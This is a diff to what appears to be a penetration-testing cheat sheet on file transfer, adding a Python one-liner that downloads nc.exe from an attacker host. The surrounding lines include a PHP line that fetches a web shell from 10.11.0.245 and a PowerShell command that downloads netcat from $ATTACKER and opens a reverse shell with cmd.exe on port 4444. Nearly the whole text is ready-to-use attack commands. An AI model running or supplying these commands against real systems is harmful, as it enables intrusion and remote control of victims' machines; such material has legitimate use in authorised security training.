@@ -330,6 +330,11 @@ ftp -s:ftp-commands.txt
 <?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
 ```
 
+##### Python
+```python
+python -c "import urllib; print urllib.urlopen('http://10.11.0.245/nc.exe').read()" > C:\Temp\nc.exe
+```
+
 ##### HTTP: Powershell
 ```PowerShell
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
